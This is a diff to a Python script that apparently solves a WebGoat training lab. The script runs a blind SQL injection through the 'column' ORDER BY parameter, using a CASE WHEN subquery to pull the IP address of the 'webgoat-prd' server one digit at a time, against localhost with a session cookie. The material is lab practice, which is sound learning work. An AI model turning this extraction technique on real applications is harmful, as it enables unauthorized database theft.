@@ -2,9 +2,9 @@ import requests
 import json
 from string import digits
 
-base_url = "http://127.0.0.1:8080"
+base_url = "http://localhost:8080"
 relative_url = "/WebGoat/SqlInjection/servers?column="
-cookie = {"JSESSIONID":"989CC4A31FF888131A56EF470F393DB8"}
+cookie = {"JSESSIONID":"D5F04DC438DF83CA1B853FDB093AE96C"}
 
 # SELECT id, hostname, ip, mac, status, description FROM <table_name> 
 # WHERE substring(ip, 1, 3) = '192' OBDER BY ?;
@@ -33,17 +33,11 @@ if __name__ == "__main__":
     for digit in range(1, 4):
         for num in digits:
         # url = url_pre + sql_begin + digit + sql_mid + num +sql_end
-            sql_end = f"""case when (SELECT ip FROM servers 
-                        WHERE hostname = 'webgoat-prd' 
-                            AND substring(ip, {digit}, 1) = '{num}' ) 
-                            IS NOT NULL 
-                        then ip 
-                        else hostname end
-                        """
+            sql_end = f"""(case when (SELECT ip FROM servers WHERE hostname = 'webgoat-prd' AND substring(ip, {digit}, 1) = '{num}' ) IS NOT NULL then ip else hostname end)"""
             url = url_pre + sql_end
             r = requests.get(url, cookies=cookie)
             jsons = r.json()
-            id = str(jsons[0]['id'])
+            id = str(jsons[0]["id"])
             if id == '2':
                 # ip
                 nums += str(num)
